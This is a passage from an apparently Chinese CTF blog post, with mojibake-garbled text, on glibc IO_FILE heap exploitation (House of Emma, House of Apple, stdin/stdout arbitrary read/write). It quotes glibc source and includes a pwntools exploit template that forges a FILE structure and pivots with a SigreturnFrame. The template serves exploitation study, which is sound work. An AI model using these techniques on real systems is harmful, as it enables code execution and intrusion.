<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="House-of-Emma"><a class="header-anchor" href="#House-of-Emma">Â¶</a>House of Emma</h3><p>2.24 ä»¥åï¼Œglibc åŠ å…¥äº†å¯¹ IOFILE ç»“æ„ä½“çš„ vtable æ˜¯å¦åœ¨æŒ‡å®šåŒºé—´çš„æ£€æµ‹ã€‚è‡ª 2.27 çš„é«˜ç‰ˆæœ¬èµ·ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„ä¿©ä¸ªå‡½æ•°(_IO_str_overflow ä¸ _IO_str_finish)ä¸­çš„å‡½æ•°æŒ‡é’ˆä¹Ÿè¢«æ›¿æ¢æˆäº† malloc å’Œ freeã€‚äºæ˜¯æˆ‘ä»¬æŠŠç›®å…‰è½¬ç§»åˆ°åˆæ³•åŒºé—´å†…çš„å¯åˆ©ç”¨å‡½æ•°ã€‚</p><h4 id="ä½¿ç”¨åœºæ™¯-v3"><a class="header-anchor" href="#ä½¿ç”¨åœºæ™¯-v3">Â¶</a>ä½¿ç”¨åœºæ™¯</h4><ol><li>å¯ä»¥ä»»æ„å†™ä¸€ä¸ªå¯æ§åœ°å€ï¼ˆLargeBin Attackã€Tcache Stashing Unlink Attackâ€¦ï¼‰</li><li>å¯ä»¥è§¦å‘ IO æµï¼ˆFSOPã€<a href="https://www.anquanke.com/post/id/235598">House OF Kiwi</a>ï¼‰</li></ol><h4 id="åŸç†-v3"><a class="header-anchor" href="#åŸç†-v3">Â¶</a>åŸç†</h4><p>åœ¨ vtable çš„åˆæ³•èŒƒå›´å†…ï¼Œå­˜åœ¨ä¸€ä¸ª _IO_cookie_jumps ï¼Œ _IO_cookie_jumps ä¸­å­˜åœ¨ä¸‹åˆ—å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br>_IO_cookie_read (FILE *fp, <span class="hljs-type">void</span> *buf, <span class="hljs-type">ssize_t</span> size)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (<span class="hljs-keyword">struct</span> _IO_cookie_file *) fp;<br>  <span class="hljs-type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (read_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (read_cb == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br>_IO_cookie_write (FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">ssize_t</span> size)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (<span class="hljs-keyword">struct</span> _IO_cookie_file *) fp;<br>  <span class="hljs-type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (write_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (write_cb == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>  <span class="hljs-type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);<br>  <span class="hljs-keyword">if</span> (n &lt; size)<br>    fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>  <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè°ƒç”¨çš„å‡½æ•°æŒ‡é’ˆ <code>read_cb</code> å’Œ <code>write_cb</code> å’Œ 2.27 ç‰ˆæœ¬çš„åˆ©ç”¨ä¸€æ ·ï¼Œéƒ½æ˜¯ä»¥ IOFILE ç»“æ„ä½“ä¸ºåŸºå¯»å€çš„ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ˜“çš„æ§åˆ¶è¿™äº›å‡½æ•°æŒ‡é’ˆã€‚</p><p>å¯æƒœçš„æ˜¯ï¼Œå¹¶æ²¡æœ‰ 2.27 ç‰ˆæœ¬é‚£ä¹ˆç®€å•ï¼Œå¦‚ä¸Šä»£ç ä¸­å­˜åœ¨ä»¥ä¸‹ä¿æŠ¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (write_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>æ€»æ‰€å‘¨çŸ¥ï¼Œglibc é‡Œé¢çš„å®éƒ½æ˜¯æ¯”è¾ƒæŠ½è±¡çš„ï¼Œè¿™ä¸ªåœ°æ–¹æœ€å¥½è¿˜æ˜¯ç»“åˆè°ƒè¯•æ¥çœ‹ï¼š</p><p>çœ‹ä¸åˆ°å°±æ˜¯è¿˜åœ¨å’•ã€‚</p><hr><h3 id="House-of-Apple"><a class="header-anchor" href="#House-of-Apple">Â¶</a>House of Apple</h3><p>å…¶å®æœ‰äº† apple ä¹‹åï¼Œå…¶ä»–çš„åè€Œæ˜¾å¾—æ²¡é‚£ä¹ˆé‡è¦äº†ï¼Œæš‚æ—¶ IOFILE ç³»åˆ—å°±æç½®åœ¨è¿™äº†ï¼Œä»¥åå†æ›´~ è¿˜æ˜¯å…ˆæ”¾ä¸ªæ¨¡æ¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">_IO_wfile_jumps = libc_base + <span class="hljs-number">0x2160c0</span><br>target_chunk = heap_base + <span class="hljs-number">0xcf0</span><br>addr = target_chunk + <span class="hljs-number">0x200</span><br>fake_frame = SigreturnFrame()<br>fake_frame.rdi = <span class="hljs-number">0</span><br>fake_frame.rsi = addr<br>fake_frame.rdx = <span class="hljs-number">0x300</span><br>fake_frame.rsp = addr<br>fake_frame.rip = libc.sym.read<br>fake_io = <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>fake_io = fake_io.ljust(<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_io += p64(target_chunk+<span class="hljs-number">0x30</span>)<br>fake_io = fake_io.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_io += p64(target_chunk+<span class="hljs-number">0xd0</span>)   <span class="hljs-comment"># RDX</span><br>fake_io = fake_io.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_io += p64(_IO_wfile_jumps)<br>fake_io += <span class="hljs-built_in">str</span>(fake_frame)[:<span class="hljs-number">0xe0</span>]<br>fake_io += p64(target_chunk+<span class="hljs-number">0xd0</span>+<span class="hljs-number">0xe0</span>+<span class="hljs-number">8</span>-<span class="hljs-number">0x68</span>) + p64(magic)<br>edit(<span class="hljs-number">2</span>,fake_io[<span class="hljs-number">0x10</span>:])<br>menu(<span class="hljs-number">0</span>)<br>rop_chain = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>sleep(<span class="hljs-number">1</span>)<br>sl(rop_chain)<br></code></pre></td></tr></table></figure><hr><p>ä¸‹é¢çš„ stdin/stdout ç›¸å…³æ¬è¿è‡ª <a href="https://bbs.pediy.com/thread-272098.htm">CTF ä¸­ glibcå †åˆ©ç”¨ åŠ IO_FILE æ€»ç»“ - winmt </a> XDã€‚</p><h2 id="stdin-ä»»æ„å†™"><a class="header-anchor" href="#stdin-ä»»æ„å†™">Â¶</a>stdin ä»»æ„å†™</h2><p><strong>æ³¨æ„</strong>ï¼š<code>scanf</code>ï¼Œ<code>fread</code>ï¼Œ<code>gets</code>ç­‰è¯»å…¥èµ°<code>IO</code>æŒ‡é’ˆï¼ˆ<code>read</code>ä¸èµ°ï¼‰ã€‚<br><strong>å¤§ä½“æµç¨‹</strong>ä¸ºï¼šè‹¥<code>_IO_buf_base</code>ä¸ºç©ºï¼Œåˆ™è°ƒç”¨<code>_IO_doallocbuf</code>å»åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºï¼Œç„¶ååˆ¤æ–­è¾“å…¥ç¼“å†²åŒºæ˜¯å¦å­˜åœ¨å‰©ä½™æ•°æ®ï¼Œå¦‚æœè¾“å…¥ç¼“å†²åŒºæœ‰å‰©ä½™æ•°æ®ï¼ˆ<code>_IO_read_end &gt; _IO_read_ptr</code>ï¼‰åˆ™å°†å…¶<strong>ç›´æ¥æ‹·è´è‡³ç›®æ ‡åœ°å€</strong>ï¼ˆä¸ä¼šå¯¹æ­¤æ—¶è¾“å…¥çš„æ•°æ®è¿›è¡Œè¯»å…¥ï¼‰ï¼Œå¦‚æœæ²¡æœ‰æˆ–ä¸å¤Ÿï¼Œåˆ™è°ƒç”¨<code>__underflow</code>å‡½æ•°<strong>æ‰§è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®</strong>ï¼ˆ<code>SYS_read</code>ï¼‰åˆ°è¾“å…¥ç¼“å†²åŒºï¼ˆä»<code>_IO_buf_base</code>åˆ°<code>_IO_buf_end</code>ï¼Œé»˜è®¤<code>0x400</code>ï¼Œå³å°†æ•°æ®è¯»åˆ°<code>_IO_buf_base</code>ï¼Œè¯»å–<code>0x400</code>ä¸ªå­—èŠ‚ï¼‰ï¼Œæ­¤æ—¶è‹¥å®é™…è¯»å…¥äº†<code>n</code>ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œåˆ™<code>_IO_read_end = _IO_buf_base + n</code>ï¼ˆå³<code>_IO_read_end</code>æŒ‡å‘å®é™…è¯»å…¥çš„æœ€åä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼‰ï¼Œä¹‹åå†å°†è¾“å…¥ç¼“å†²åŒºä¸­çš„æ•°æ®æ‹·è´åˆ°ç›®æ ‡åœ°å€ã€‚<br>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè‹¥è¾“å…¥ç¼“å†²åŒºä¸­æ²¡æœ‰å‰©ä½™çš„æ•°æ®ï¼Œåˆ™æ¯æ¬¡è¯»å…¥æ•°æ®è¿›è¾“å…¥ç¼“å†²åŒºï¼Œä»…å’Œ<code>_IO_buf_base</code>ä¸<code>_IO_buf_end</code>æœ‰å…³ã€‚<br>åœ¨å°†æ•°æ®ä»è¾“å…¥ç¼“å†²åŒºæ‹·è´åˆ°ç›®æ ‡åœ°å€çš„è¿‡ç¨‹ä¸­ï¼Œ<strong>éœ€è¦æ»¡è¶³æ‰€è°ƒç”¨çš„è¯»å…¥å‡½æ•°çš„è‡ªèº«çš„é™åˆ¶æ¡ä»¶</strong>ï¼Œä¾‹å¦‚ï¼šä½¿ç”¨<code>scanf(&quot;%d&quot;,&amp;a)</code>è¯»å…¥æ•´æ•°ï¼Œåˆ™å½“åœ¨è¾“å…¥ç¼“å†²åŒºä¸­é‡åˆ°äº†å­—ç¬¦ï¼ˆæˆ–<code>scanf</code>çš„ä¸€äº›æˆªæ–­ç¬¦ï¼‰ç­‰ä¸ç¬¦åˆçš„æƒ…å†µï¼Œå°±ä¼šåœæ­¢è¿™ä¸ªæ‹·è´çš„è¿‡ç¨‹ã€‚æœ€ç»ˆï¼Œ<code>_IO_read_ptr</code>æŒ‡å‘æˆåŠŸæ‹·è´åˆ°ç›®çš„åœ°å€ä¸­çš„æœ€åä¸€ä¸ªå­—èŠ‚æ•°æ®åœ¨è¾“å…¥ç¼“å†²åŒºä¸­çš„åœ°å€ã€‚å› æ­¤ï¼Œè‹¥æ˜¯é‡åˆ°äº†ä¸ç¬¦åˆé™åˆ¶æ¡ä»¶çš„æƒ…å†µè€Œç»ˆæ­¢æ‹·è´ï¼Œåˆ™æœ€ç»ˆä¼šä½¿å¾—<code>_IO_read_end &gt; _IO_read_ptr</code>ï¼Œå³å†ä¸‹ä¸€æ¬¡è¯»å…¥ä¹‹å‰ä¼šè¢«è®¤å®šä¸ºè¾“å…¥ç¼“å†²åŒºä¸­ä»æœ‰å‰©ä½™æ•°æ®ï¼Œåœ¨æ­¤æƒ…å†µä¸‹ï¼Œ<strong>å¾ˆæœ‰å¯èƒ½ä¸ä¼šè¿›è¡Œæ­¤æ¬¡è¯»å…¥</strong>ï¼Œæˆ–å°†è¾“å…¥ç¼“å†²åŒºä¸­å‰©ä½™çš„æ•°æ®æ‹·è´åˆ°æ­¤æ¬¡è¯»å…¥çš„ç›®æ ‡åœ°å€ï¼Œä»è€Œ<strong>å¯¼è‡´è¯»å…¥çš„é”™è¯¯</strong>ã€‚<br><code>getchar()</code>å’Œ<code>IO_getc()</code>çš„ä½œç”¨æ˜¯åˆ·æ–°<code>_IO_read_ptr</code>ï¼Œæ¯æ¬¡è°ƒç”¨ï¼Œä¼šä»è¾“å…¥ç¼“å†²åŒºè¯»ä¸€ä¸ªå­—èŠ‚æ•°æ®ï¼Œå³å°†<code>_IO_read_ptr++</code>ã€‚</p><h3 id="ç›¸å…³æºç "><a class="header-anchor" href="#ç›¸å…³æºç ">Â¶</a><strong>ç›¸å…³æºç </strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t _IO_file_xsgetn (_IO_FILE *fp, <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br> ...<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ...<br>      <span class="hljs-comment">//è¾“å…¥ç¼“å†²åŒºä¸ºç©ºåˆ™åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒº</span><br>    &#125;<br>  <span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>      <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>          ...<br>          <span class="hljs-comment">//memcpy</span><br> <br>        &#125;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>          &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)  <span class="hljs-comment">// è°ƒç”¨__underflowè¯»å…¥æ•°æ®</span><br>          ...<br>        &#125;<br>      ...<br>  <span class="hljs-keyword">return</span> n - want;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_new_file_underflow (_IO_FILE *fp)<br>&#123;<br>  _IO_ssize_t count;<br>  ...<br>  <span class="hljs-comment">// ä¼šæ£€æŸ¥_flagsæ˜¯å¦åŒ…å«_IO_NO_READSæ ‡å¿—ï¼ŒåŒ…å«åˆ™ç›´æ¥è¿”å›ã€‚</span><br>  <span class="hljs-comment">// æ ‡å¿—çš„å®šä¹‰æ˜¯#define _IO_NO_READS 4ï¼Œå› æ­¤_flagsä¸èƒ½åŒ…å«4ã€‚</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-comment">// å¦‚æœè¾“å…¥ç¼“å†²åŒºé‡Œå­˜åœ¨æ•°æ®ï¼Œåˆ™ç›´æ¥è¿”å›</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>  ...<br>  <span class="hljs-comment">// è°ƒç”¨_IO_SYSREADå‡½æ•°æœ€ç»ˆæ‰§è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®</span><br>  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,<br>               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<br>  ...<br>&#125;<br>libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)<br></code></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼Œ<strong>stdin</strong> ä¸ºäº†åšåˆ°<strong>ä»»æ„å†™</strong>ï¼Œæ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼Œå³å¯è¿›è¡Œåˆ©ç”¨ï¼š<br>(1) è®¾ç½®<code>_IO_read_end</code>ç­‰äº<code>_IO_read_ptr</code>ï¼ˆä½¿å¾—è¾“å…¥ç¼“å†²åŒºå†…æ²¡æœ‰å‰©ä½™æ•°æ®ï¼Œä»è€Œå¯ä»¥ä»ç”¨æˆ·è¯»å…¥æ•°æ®ï¼‰ã€‚<br>(2) è®¾ç½®<code>_flag &amp;~ _IO_NO_READS</code>å³<code>_flag &amp;~ 0x4</code>ï¼ˆä¸€èˆ¬ä¸ç”¨ç‰¹æ„è®¾ç½®ï¼‰ã€‚<br>(3) è®¾ç½®<code>_fileno</code>ä¸º<code>0</code>ï¼ˆä¸€èˆ¬ä¸ç”¨ç‰¹æ„è®¾ç½®ï¼‰ã€‚<br>(4) è®¾ç½®<code>_IO_buf_base</code>ä¸º<code>write_start</code>ï¼Œ<code>_IO_buf_end</code>ä¸º<code>write_end</code>ï¼ˆæˆ‘ä»¬ç›®æ ‡å†™çš„èµ·å§‹åœ°å€æ˜¯<code>write_start</code>ï¼Œå†™ç»“æŸåœ°å€ä¸º<code>write_end</code>ï¼‰ï¼Œä¸”ä½¿å¾—<code>_IO_buf_end-_IO_buf_base</code>å¤§äºè¦å†™å…¥çš„æ•°æ®é•¿åº¦ã€‚</p><h2 id="stdout-ä»»æ„è¯»å†™"><a class="header-anchor" href="#stdout-ä»»æ„è¯»å†™">Â¶</a>stdout ä»»æ„è¯»å†™</h2><p><strong>æ³¨æ„</strong>ï¼š<code>printf</code>ï¼Œ<code>fwrite</code>ï¼Œ<code>puts</code>ç­‰è¾“å‡ºèµ°<code>IO</code>æŒ‡é’ˆï¼ˆ<code>write</code>ä¸èµ°ï¼‰ã€‚<br>åœ¨<code>_IO_2_1_stdout_</code>ä¸­ï¼Œ<code>_IO_buf_base</code>å’Œ<code>_IO_buf_end</code>ä¸ºè¾“å‡ºç¼“å†²åŒºèµ·å§‹ä½ç½®ï¼ˆé»˜è®¤å¤§å°ä¸º<code>0x400</code>ï¼‰ï¼Œåœ¨è¾“å‡ºçš„è¿‡ç¨‹ä¸­ï¼Œä¼šå…ˆå°†éœ€è¦è¾“å‡ºçš„æ•°æ®ä»ç›®æ ‡åœ°å€æ‹·è´åˆ°è¾“å‡ºç¼“å†²åŒºï¼Œå†ä»è¾“å‡ºç¼“å†²åŒºè¾“å‡ºç»™ç”¨æˆ·ã€‚<br>ç¼“å†²åŒºå»ºç«‹å‡½æ•°<code>_IO_doallocbuf</code>ä¼šå»ºç«‹è¾“å‡ºç¼“å†²åŒºï¼Œå¹¶æŠŠåŸºåœ°å€ä¿å­˜åœ¨<code>_IO_buf_base</code>ä¸­ï¼Œç»“æŸåœ°å€ä¿å­˜åœ¨<code>_IO_buf_end</code>ä¸­ã€‚åœ¨å»ºç«‹é‡Œè¾“å‡ºç¼“å†²åŒºåï¼Œä¼šå°†åŸºå€å€ç»™<code>_IO_write_base</code>ï¼Œè‹¥æ˜¯è®¾ç½®çš„æ˜¯å…¨ç¼“å†²æ¨¡å¼<code>_IO_FULL_BUF</code>ï¼Œåˆ™ä¼šå°†ç»“æŸåœ°å€ç»™<code>_IO_write_end</code>ï¼Œè‹¥æ˜¯è®¾ç½®çš„æ˜¯è¡Œç¼“å†²æ¨¡å¼<code>_IO_LINE_BUF</code>ï¼Œåˆ™<code>_IO_write_end</code>ä¸­å­˜çš„æ˜¯<code>_IO_buf_base</code>ï¼Œæ­¤å¤–ï¼Œ<code>_IO_write_ptr</code>è¡¨ç¤ºè¾“å‡ºç¼“å†²åŒºä¸­å·²ç»ä½¿ç”¨åˆ°çš„åœ°å€ã€‚å³<code>_IO_write_base</code>åˆ°<code>_IO_write_ptr</code>ä¹‹é—´çš„ç©ºé—´æ˜¯å·²ç»ä½¿ç”¨çš„ç¼“å†²åŒºï¼Œ<code>_IO_write_ptr</code>åˆ°<code>_IO_write_end</code>ä¹‹é—´ä¸ºå‰©ä½™çš„è¾“å‡ºç¼“å†²åŒºã€‚<br>æœ€ç»ˆå®é™…è°ƒç”¨äº†<code>_IO_2_1_stdout_</code>çš„<code>vtable</code>ä¸­çš„<code>_xsputn</code>ï¼Œä¹Ÿå°±æ˜¯<code>_IO_new_file_xsputn</code>å‡½æ•°ï¼Œæºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">IO_size_t _IO_new_file_xsputn (_IO_FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) data;<br>  _IO_size_t to_do = n;<br>  <span class="hljs-type">int</span> must_flush = <span class="hljs-number">0</span>;<br>  _IO_size_t count = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123; <span class="hljs-comment">//å¦‚æœæ˜¯è¡Œç¼“å†²æ¨¡å¼...</span><br>      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr; <span class="hljs-comment">//åˆ¤æ–­è¾“å‡ºç¼“å†²åŒºè¿˜æœ‰å¤šå°‘ç©ºé—´</span><br>      <span class="hljs-keyword">if</span> (count &gt;= n)<br>        &#123;<br>          <span class="hljs-type">const</span> <span class="hljs-type">char</span> *p;<br>          <span class="hljs-keyword">for</span> (p = s + n; p &gt; s; )<br>            &#123;<br>              <span class="hljs-keyword">if</span> (*--p == <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment">//æœ€åä¸€ä¸ªæ¢è¡Œç¬¦\nä¸ºæˆªæ–­ç¬¦ï¼Œä¸”éœ€è¦åˆ·æ–°è¾“å‡ºç¼“å†²åŒº</span><br>                &#123;<br>                  count = p - s + <span class="hljs-number">1</span>;<br>                  must_flush = <span class="hljs-number">1</span>; <span class="hljs-comment">//æ ‡å¿—ä¸ºçœŸï¼šéœ€è¦åˆ·æ–°è¾“å‡ºç¼“å†²åŒº</span><br>                  <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr) <span class="hljs-comment">//åˆ¤æ–­è¾“å‡ºç¼“å†²åŒºè¿˜æœ‰å¤šå°‘ç©ºé—´ï¼ˆå…¨ç¼“å†²æ¨¡å¼ï¼‰</span><br>    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">//å¦‚æœè¾“å‡ºç¼“å†²åŒºæœ‰ç©ºé—´ï¼Œåˆ™å…ˆæŠŠæ•°æ®æ‹·è´è‡³è¾“å‡ºç¼“å†²åŒº</span><br>      <span class="hljs-keyword">if</span> (count &gt; to_do)<br>    count = to_do;<br>      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);<br>      s += count;<br>      to_do -= count;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (to_do + must_flush &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//æ­¤å¤„å…³é”®ï¼Œè§ä¸‹æ–‡è¯¦ç»†è®¨è®º</span><br>    &#123;<br>      _IO_size_t block_size, do_write;<br>      <span class="hljs-keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF) <span class="hljs-comment">//è°ƒç”¨_IO_OVERFLOW</span><br>        <span class="hljs-keyword">return</span> to_do == <span class="hljs-number">0</span> ? EOF : n - to_do;<br>      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;<br>      do_write = to_do - (block_size &gt;= <span class="hljs-number">128</span> ? to_do % block_size : <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> (do_write)<br>        &#123;<br>          count = new_do_write (f, s, do_write);<br>          to_do -= count;<br>          <span class="hljs-keyword">if</span> (count &lt; do_write)<br>            <span class="hljs-keyword">return</span> n - to_do;<br>        &#125;<br>      <span class="hljs-keyword">if</span> (to_do)<br>        to_do -= _IO_default_xsputn (f, s+do_write, to_do);<br>    &#125;<br>  <span class="hljs-keyword">return</span> n - to_do;<br>&#125;<br>libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)<br></code></pre></td></tr></table></figure><h3 